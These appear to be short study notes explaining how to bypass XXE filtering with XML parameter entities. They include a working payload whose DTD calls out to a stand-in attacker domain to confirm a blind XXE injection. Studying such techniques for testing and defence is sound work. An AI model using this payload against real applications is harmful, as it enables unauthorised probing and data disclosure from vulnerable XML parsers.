Sometimes, XXE attacks using regular entities are blocked, due to some input validation by the application or some hardening of 
the XML parser that is being used. In this situation, you might be able to use XML parameter entities instead.


the declaration of an XML parameter entity includes the percent character before the entity name
<!ENTITY % myparameterentity "my parameter entity value" >

also parameter entities are referenced using the percent character instead of the usual ampersand:
%myparameterentity;

to use these we can do this:
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>

This XXE payload declares an XML parameter entity called xxe and then uses the entity within the DTD.
This will cause a DNS lookup and HTTP request to the attacker's domain, verifying that the attack was successful.
